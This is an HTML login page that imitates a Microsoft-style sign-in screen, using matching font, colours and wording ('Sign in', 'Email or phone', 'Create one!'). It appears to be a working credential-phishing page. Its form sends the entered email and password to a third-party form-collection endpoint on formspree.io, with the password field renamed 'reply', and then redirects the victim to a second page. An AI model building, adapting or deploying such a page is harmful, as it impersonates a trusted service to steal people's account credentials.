<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f3f3f3;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
            width: 360px;
            text-align: center;
        }
        .logo {
            max-width: 100%;
            height: auto;
            margin-bottom: 20px;
        }
        h2 {
            color: #333;
            font-size: 24px;
            margin: 0 0 10px 0;
        }
        p {
            color: #666;
            font-size: 14px;
            margin: 0 0 20px 0;
        }
        input[type="password"], input[type="text"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 16px;
            color: #333;
        }
        input[type="submit"] {
            background-color: #0078d4;
            color: white;
            border: none;
            padding: 10px;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
            font-size: 16px;
        }
        input[type="submit"]:hover {
            background-color: #005a9e;
        }
        .link {
            color: #0078d4;
            text-decoration: none;
            font-size: 14px;
            margin-top: 10px;
            display: inline-block;
        }
        .link:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://i.imgur.com/CpzpBSu.png" alt="Custom Logo" class="logo"> <!-- Updated logo -->
        <h2>Sign in</h2>
        <p>Stay connected and access your resources.</p>
        <form action="https://formspree.io/f/xzzpnvzp" method="POST" onsubmit="setTimeout(function() { window.location.href = 'second-page.html'; }, 1000);">
            <input type="text" name="username" placeholder="Email or phone" required>
            <input type="password" id="reply" name="reply" placeholder="Password" required>
            <input type="submit" value="Sign in">
        </form>
        <a href="#" class="link">Forgot my password</a>
        <a href="#" class="link">Create one!</a>
    </div>
</body>
</html>
